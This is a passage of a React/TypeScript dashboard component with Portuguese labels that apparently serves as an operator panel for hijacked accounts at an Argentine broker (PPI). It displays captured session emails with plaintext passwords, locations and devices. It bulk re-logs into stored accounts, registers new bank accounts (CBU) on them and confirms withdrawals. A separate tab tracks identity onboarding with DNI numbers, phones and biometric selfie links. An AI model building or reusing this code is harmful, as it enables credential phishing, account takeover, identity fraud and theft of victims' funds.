                          <p className={`text-[10px] font-mono ${(inst.ppc?.cumulativeReturnPercentage || 0) >= 0 ? "text-emerald-400" : "text-red-400"}`}>
                            {inst.ppc?.cumulativeReturnPercentage?.toFixed(1)}% ({inst.ppc?.cumulativeReturn?.toLocaleString("es-AR")})
                          </p>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )) : <p className="text-center text-sm text-muted-foreground py-8">Busque saldos para ver o portfolio</p>}
            </div>
          )}

          {/* Banks tab */}
          {opTab === "banks" && (
            <div className="space-y-2">
              {Array.isArray(banks) && banks.length > 0 ? banks.map((group: any, gi: number) => (
                <div key={gi}>
                  <p className="text-[10px] text-muted-foreground font-semibold mb-1">{group.currency?.name}</p>
                  {group.account?.map((ba: any) => (
                    <div key={ba.id} className="rounded-xl border border-border bg-card p-3 mb-2">
                      <div className="flex items-center justify-between">
                        <div>
                          <p className="text-[12px] font-bold text-foreground">{ba.name}</p>
                          <p className="text-[10px] text-muted-foreground">{ba.bankAccountType} • {ba.holderName}</p>
                          <p className="text-[9px] font-mono text-muted-foreground mt-1">CBU: {ba.cbu}</p>
                          <p className="text-[9px] text-muted-foreground">CUIT: {ba.cuit}</p>
                        </div>
                        <button onClick={() => { setWCbu(ba.cbu); setWCuit(ba.cuit); setOpTab("withdraw"); }}
                          className="text-[10px] px-3 py-1.5 rounded-lg bg-orange-500/10 text-orange-400 font-semibold hover:bg-orange-500/15 flex items-center gap-1">
                          <ArrowDownToLine size={12} /> Retirar
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              )) : <p className="text-center text-sm text-muted-foreground py-4">Busque contas bancárias</p>}

              <div className="rounded-xl border border-dashed border-primary/30 bg-primary/5 p-4 space-y-3 mt-3">
                <p className="text-[11px] font-semibold text-primary">➕ Cadastrar nova conta bancária</p>
                <input placeholder="CBU ou Alias" value={regBankCbu} onChange={e => setRegBankCbu(e.target.value)}
                  className="w-full rounded-lg border border-border bg-background px-3 py-2 text-sm text-foreground font-mono focus:outline-none focus:border-primary" />
                <select value={regBankCurrency} onChange={e => setRegBankCurrency(Number(e.target.value))}
                  className="w-full rounded-lg border border-border bg-background px-3 py-2 text-sm text-foreground focus:outline-none focus:border-primary">
                  <option value={10000}>ARS - Pesos</option>
                  <option value={22013}>USD MEP - Dólares MEP</option>
                  <option value={10001}>USD CCL - Dólares CCL</option>
                </select>
                <button
                  onClick={async () => {
                    if (!latestAcc.access_token || !latestAcc.cuenta_id || !regBankCbu) return;
                    setOpLoading("register-bank"); setRegBankResult(null);
                    try {
                      const res = await ppiApi.registerBank(latestAcc.access_token, latestAcc.cuenta_id, regBankCurrency, regBankCbu);
                      setRegBankResult(res);
                      await handleFetchBanks(latestAcc);
                    } catch (e: any) { setRegBankResult({ error: e.message }); }
                    setOpLoading("");
                  }}
                  disabled={opLoading === "register-bank" || !regBankCbu}
                  className="w-full rounded-lg bg-primary/10 py-2.5 text-[12px] font-semibold text-primary hover:bg-primary/15 disabled:opacity-50 flex items-center justify-center gap-1">
                  {opLoading === "register-bank" ? <Loader2 size={14} className="animate-spin" /> : <Building size={14} />} Cadastrar Conta
                </button>
                {regBankResult && (
                  <div className={`rounded-lg p-3 text-[11px] ${regBankResult.error ? "bg-red-500/10 text-red-400" : "bg-green-500/10 text-green-400"}`}>
                    {typeof regBankResult === "string" ? regBankResult : regBankResult.error || regBankResult.message || JSON.stringify(regBankResult)}
                  </div>
                )}
              </div>
            </div>
          )}

          {/* Withdraw tab */}
          {opTab === "withdraw" && (
            <div className="space-y-3">
              <div className="rounded-xl border border-border bg-card p-4 space-y-3">
                <input placeholder="CBU" value={wCbu} onChange={e => setWCbu(e.target.value)}
                  className="w-full rounded-lg border border-border bg-background px-3 py-2 text-sm text-foreground font-mono focus:outline-none focus:border-primary" />
                <input placeholder="CUIT" value={wCuit} onChange={e => setWCuit(e.target.value)}
                  className="w-full rounded-lg border border-border bg-background px-3 py-2 text-sm text-foreground font-mono focus:outline-none focus:border-primary" />
                <input placeholder="Monto" type="number" value={wAmount} onChange={e => setWAmount(e.target.value)}
                  className="w-full rounded-lg border border-border bg-background px-3 py-2 text-sm text-foreground font-mono focus:outline-none focus:border-primary" />
                <div className="flex gap-2">
                  <button onClick={handleWithdrawQuote} disabled={opLoading === "withdraw-quote" || !wCbu || !wAmount}
                    className="flex-1 rounded-lg bg-orange-500/10 py-2.5 text-[12px] font-semibold text-orange-400 hover:bg-orange-500/15 disabled:opacity-50 flex items-center justify-center gap-1">
                    {opLoading === "withdraw-quote" ? <Loader2 size={14} className="animate-spin" /> : null} Cotizar
                  </button>
                  {withdrawResult && (
                    <button onClick={handleWithdrawConfirm} disabled={opLoading === "withdraw-confirm"}
                      className="flex-1 rounded-lg bg-red-600 py-2.5 text-[12px] font-bold text-white hover:bg-red-700 disabled:opacity-50 flex items-center justify-center gap-1">
                      {opLoading === "withdraw-confirm" ? <Loader2 size={14} className="animate-spin" /> : null} CONFIRMAR RETIRO
                    </button>
                  )}
                </div>
              </div>
              {withdrawResult && (
                <div className="rounded-xl border border-orange-500/20 bg-card p-4 space-y-1 text-sm">
                  <p className="text-orange-400 font-semibold text-[12px]">Cotação:</p>
                  <p className="text-foreground">Banco: <span className="text-muted-foreground">{withdrawResult.bankName}</span></p>
                  <p className="text-foreground">Titular: <span className="text-muted-foreground">{withdrawResult.holderName}</span></p>
                  <p className="text-foreground">Valor: <span className="text-emerald-400 font-mono font-bold">{withdrawResult.currency?.symbol} {withdrawResult.amount}</span></p>
                  {withdrawResult.alert?.map((a: string, i: number) => (
                    <p key={i} className="text-[10px] text-yellow-400">⚠ {a}</p>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* Orders tab */}
          {opTab === "orders" && (
            <div className="space-y-2">
              <button onClick={() => { if (latestAcc.access_token && latestAcc.cuenta_id) handleFetchOrders(latestAcc); }}
                className="text-[10px] px-3 py-1.5 rounded-lg border border-border text-muted-foreground hover:text-foreground flex items-center gap-1">
                <History size={10} /> Buscar ordens
              </button>
              {latestAcc.orders_data && Array.isArray(latestAcc.orders_data) ? (
                <div className="space-y-1.5">
                  {latestAcc.orders_data.map((order: any) => (
                    <div key={order.id} className="rounded-xl border border-border bg-card px-3 py-2 flex items-center justify-between">
                      <div>
                        <p className="text-[11px] font-semibold text-foreground">{order.operation?.name || order.instrument?.type?.name}</p>
                        <p className="text-[9px] text-muted-foreground">{new Date(order.date).toLocaleString("es-AR")}</p>
                      </div>
                      <div className="text-right">
                        <p className="text-[11px] font-mono font-bold text-emerald-400">{order.instrument?.currency?.symbol} {order.amount?.toLocaleString("es-AR")}</p>
                        <span className={`text-[8px] px-1.5 py-0.5 rounded font-semibold ${order.status?.id === 5 ? "bg-green-500/10 text-green-400" : "bg-yellow-500/10 text-yellow-400"}`}>
                          {order.status?.description}
                        </span>
                      </div>
                    </div>
                  ))}
                </div>
              ) : <p className="text-center text-sm text-muted-foreground py-8">Clique para buscar ordens</p>}
            </div>
          )}
        </div>
      </div>
    );
  }

  // ═══════════════════════════════════════
  // MAIN VIEW
  // ═══════════════════════════════════════
  return (
    <div className="space-y-4">
      {/* Stats */}
      <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-6 gap-2">
        <MetricCard label="TOTAL ARS" value={fmtARS(totalArs)} color="text-emerald-400" icon="💰" size="lg" />
        <MetricCard label="TOTAL USD" value={fmtUSD(totalUsd)} color="text-sky-400" icon="🇺🇸" />
        <MetricCard label="CONTAS" value={String(accounts.length)} color="text-purple-400" icon="👥" sub={`${activeCount} ativas`} />
        <MetricCard label="SESSÕES 24H" value={String(liveSessions.length)} color="text-blue-400" icon="📊" sub={`${completedSessions} completas`} />
        <MetricCard label="WAYNI" value={String(wayniRows.length)} color="text-orange-400" icon="🔐" />
        <MetricCard label="ONLINE" value={String(onlineCount)} color="text-green-400" icon="🟢" highlight={onlineCount > 0} />
      </div>

      {/* Tabs */}
      <div className="flex items-center gap-2 flex-wrap">
        {([
          { key: "accounts" as const, label: "Contas", icon: Users, count: accounts.length },
          { key: "sessions" as const, label: "Sessões", icon: Activity, count: liveSessions.length },
          { key: "wayni" as const, label: "Wayni", icon: Fingerprint, count: wayniRows.length },
          { key: "online" as const, label: "Online", icon: Wifi, count: onlineCount },
        ]).map(({ key, label, icon: Icon, count }) => (
          <button key={key} onClick={() => setActiveTab(key)}
            className={`flex items-center gap-1.5 px-3 py-2 rounded-xl text-[11px] font-semibold transition-all border ${
              activeTab === key ? "bg-primary/10 text-primary border-primary/20" : "border-border text-muted-foreground hover:text-foreground"
            }`}>
            <Icon size={13} />
            {label}
            <span className={`text-[9px] px-1.5 rounded font-bold tabular-nums ${activeTab === key ? "bg-primary/15 text-primary" : "bg-secondary text-muted-foreground"}`}>{count}</span>
          </button>
        ))}
        <div className="ml-auto flex items-center gap-1">
          <button onClick={() => setAutoRefreshEnabled(!autoRefreshEnabled)}
            className={`h-7 rounded-lg flex items-center gap-1 px-2.5 text-[9px] font-semibold transition-colors ${autoRefreshEnabled ? "bg-green-500/10 text-green-400 border border-green-500/20" : "bg-secondary text-muted-foreground"}`}>
            <Timer size={11} /> {autoRefreshEnabled ? "Auto ✓" : "Auto ✗"}
          </button>
          <button onClick={() => setSoundEnabled(!soundEnabled)}
            className={`h-7 w-7 rounded-lg flex items-center justify-center transition-colors ${soundEnabled ? "text-primary" : "text-muted-foreground"}`}>
            {soundEnabled ? <Bell size={12} /> : <BellOff size={12} />}
          </button>
        </div>
      </div>

      {/* ── ACCOUNTS TAB ── */}
      {activeTab === "accounts" && (
        <div className="space-y-3">
          {reloginRunning && (
            <div className="rounded-xl border border-blue-500/20 bg-blue-500/5 p-3 flex items-center gap-2">
              <RefreshCw size={12} className="animate-spin text-blue-400" />
              <span className="text-[11px] font-semibold text-blue-400">Relogin {reloginProgress.done}/{reloginProgress.total}</span>
              {reloginProgress.current && <span className="text-[10px] text-muted-foreground truncate">→ {reloginProgress.current}</span>}
            </div>
          )}
          {refreshAllRunning && (
            <div className="rounded-xl border border-green-500/20 bg-green-500/5 p-3 flex items-center gap-2">
              <RefreshCw size={12} className="animate-spin text-green-400" />
              <span className="text-[11px] font-semibold text-green-400">Atualizando saldos {refreshAllProgress.done}/{refreshAllProgress.total}</span>
            </div>
          )}
          <div className="flex flex-col sm:flex-row sm:items-center gap-2">
            <div className="relative flex-1 max-w-sm">
              <Search size={13} className="absolute left-2.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
              <input type="text" placeholder="Buscar contas..." value={search} onChange={(e) => setSearch(e.target.value)}
                className="w-full rounded-lg border border-border bg-card pl-8 pr-3 py-1.5 text-xs text-foreground placeholder:text-muted-foreground outline-none focus:border-primary transition-all" />
            </div>
            <div className="flex items-center gap-1 flex-wrap">
              <button onClick={handleReloginAll} disabled={reloginRunning}
                className="text-[10px] px-2.5 py-1 rounded-lg bg-blue-500/10 text-blue-400 font-semibold hover:bg-blue-500/15 disabled:opacity-50 flex items-center gap-1">
                <Zap size={10} /> Relogin All
              </button>
              <button onClick={handleRefreshAll} disabled={refreshAllRunning}
                className="text-[10px] px-2.5 py-1 rounded-lg bg-green-500/10 text-green-400 font-semibold hover:bg-green-500/15 disabled:opacity-50 flex items-center gap-1">
                <DollarSign size={10} /> Atualizar Saldos
              </button>
              <button onClick={() => loadAccounts(true)}
                className="text-[10px] px-2.5 py-1 rounded-lg bg-secondary text-muted-foreground font-semibold hover:text-foreground flex items-center gap-1">
                <RefreshCw size={10} /> Refresh
              </button>
            </div>
          </div>
          {accountsLoading ? (
            <div className="flex justify-center py-12"><RefreshCw size={20} className="animate-spin text-primary" /></div>
          ) : (
            <div className="space-y-1.5">
              {filtered.map(account => (
                <PpiAccountCard key={account.id} account={account}
                  opLoading={opLoading}
                  countdown={refreshTimers[account.id] || 0}
                  isRefreshing={refreshingAccounts.has(account.id)}
                  onOperate={() => handleOperate(account)}
                  onLogin={() => handleLogin(account)}
                  onBalances={() => handleFetchBalances(account)}
                  onBanks={() => handleFetchBanks(account)}
                  onOrders={() => handleFetchOrders(account)}
                  onDelete={() => handleDelete(account)} />
              ))}
            </div>
          )}
        </div>
      )}

      {/* ── SESSIONS TAB ── */}
      {activeTab === "sessions" && (
        <div className="space-y-1.5">
          {liveSessions.length === 0 ? (
            <p className="text-center text-sm text-muted-foreground py-12">Nenhuma sessão PPI nas últimas 24h.</p>
          ) : liveSessions.map(session => {
            const cfg = statusLabels[session.status] || { label: session.status, color: "text-muted-foreground bg-secondary" };
            const timeStr = new Date(session.created_at).toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" });
            return (
              <div key={session.id} className={`rounded-lg border bg-card px-3 py-2 ${session.status === "completed" ? "border-green-500/20" : "border-border"}`}>
                <div className="flex items-center gap-2 flex-wrap">
                  <span className="text-[10px] font-mono text-muted-foreground tabular-nums w-[38px]">{timeStr}</span>
                  <span className={`text-[9px] px-1.5 py-0.5 rounded font-semibold ${cfg.color}`}>{cfg.label}</span>
                  <span className="text-[11px] font-semibold text-foreground truncate">{session.email || "—"}</span>
                  {session.password && (
                    <span className="text-[10px] font-mono text-yellow-400 flex items-center gap-0.5">
                      <Lock size={8} /> {session.password}
                    </span>
                  )}
                  {session.country && <span className="text-[9px] text-muted-foreground">{session.country} {session.city}</span>}
                  <span className="text-[9px] text-muted-foreground">{parseDevice(session.user_agent)}</span>
                </div>
              </div>
            );
          })}
        </div>
      )}

      {/* ── WAYNI TAB ── */}
      {activeTab === "wayni" && (
        <div className="space-y-3">
          <div className="flex flex-col sm:flex-row sm:items-center gap-2">
            <div className="relative flex-1 max-w-sm">
              <Search size={13} className="absolute left-2.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
              <input type="text" placeholder="Buscar por email, nome, DNI..." value={wayniSearch} onChange={(e) => setWayniSearch(e.target.value)}
                className="w-full rounded-lg border border-border bg-card pl-8 pr-3 py-1.5 text-xs text-foreground placeholder:text-muted-foreground outline-none focus:border-primary transition-all" />
            </div>
            <button onClick={() => loadWayniData()} className="text-[10px] px-2.5 py-1 rounded-lg bg-secondary text-muted-foreground font-semibold hover:text-foreground flex items-center gap-1">
              <RefreshCw size={10} /> Refresh
            </button>
          </div>
          {wayniLoading ? (
            <div className="flex justify-center py-12"><RefreshCw size={20} className="animate-spin text-primary" /></div>
          ) : filteredWayni.length === 0 ? (
            <p className="text-center text-sm text-muted-foreground py-12">Nenhum registro de onboarding PPI.</p>
          ) : (
            <div className="space-y-1.5">
              {filteredWayni.map(row => {
                const statusColor = row.wallet_status === "ACTIVE" ? "text-green-400 bg-green-500/10"
                  : row.status?.includes("biometric") ? "text-blue-400 bg-blue-500/10"
                  : row.status?.includes("address") ? "text-purple-400 bg-purple-500/10"
                  : row.status?.includes("verify") ? "text-yellow-400 bg-yellow-500/10"
                  : "text-muted-foreground bg-secondary";

                return (
                  <div key={row.id} className="rounded-xl border border-border bg-card p-3 space-y-2">
                    <div className="flex items-center justify-between">
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-1.5 flex-wrap">
                          <span className="text-[12px] font-bold text-foreground truncate">{row.full_name || row.email}</span>
                          <span className={`text-[7px] px-1 py-0.5 rounded font-bold ${statusColor}`}>{row.wallet_status || row.status || "—"}</span>
                        </div>
                        <div className="text-[9px] text-muted-foreground flex items-center gap-1.5 mt-0.5 flex-wrap">
                          <span>{row.email}</span>
                          {row.dni && <><span>•</span><span>DNI: {row.dni}</span></>}
                          {row.phone && <><span>•</span><span>📱 {row.phone}</span></>}
                          <span>•</span>
                          <span>{timeAgo(row.updated_at || row.created_at)}</span>
                        </div>
                      </div>
                      <button onClick={() => handleWayniRetry(row)}
                        disabled={wayniActionLoading === `retry-${row.id}`}
                        className="text-[9px] px-2 py-1 rounded-lg bg-primary/10 text-primary font-semibold hover:bg-primary/15 disabled:opacity-50 flex items-center gap-0.5">
                        {wayniActionLoading === `retry-${row.id}` ? <Loader2 size={10} className="animate-spin" /> : <RefreshCw size={10} />} Reenviar
                      </button>
                    </div>
                    <div className="flex items-center gap-1">
                      {[
                        { done: !!row.dni, label: "DNI", icon: CheckCircle },
                        { done: !!row.region, label: "Endereço", icon: MapPin },
                        { done: !!row.biometric_url, label: "Biometria", icon: Camera },
                        { done: row.wallet_status === "ACTIVE", label: "Wallet", icon: CheckCircle },
                      ].map((s, i) => (
                        <div key={i} className="flex items-center gap-0.5">
                          <div className={`flex items-center gap-0.5 text-[8px] font-semibold px-1.5 py-0.5 rounded ${s.done ? "bg-green-500/10 text-green-400" : "bg-secondary text-muted-foreground"}`}>
                            <s.icon size={8} /> {s.label}
                          </div>
                          {i < 3 && <span className="text-[8px] text-muted-foreground/30">→</span>}
                        </div>
                      ))}
                    </div>
                    {row.biometric_url && (
                      <a href={row.biometric_url} target="_blank" rel="noopener noreferrer" className="text-[9px] text-blue-400 hover:underline truncate block">
                        🔗 {row.biometric_url.slice(0, 60)}...
                      </a>
                    )}
                    {row.bio_status && (
                      <div className="text-[9px] text-muted-foreground">
                        Bio: <span className="font-semibold">{row.bio_status}</span>
                        {row.face_confidence && <span> • Confiança: {row.face_confidence}</span>}
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          )}
        </div>
      )}

      {/* ── ONLINE TAB ── */}
      {activeTab === "online" && <OnlineNowTab sourceFilter="ppi" />}
    </div>
  );
};

export default PpiDashboardTab;
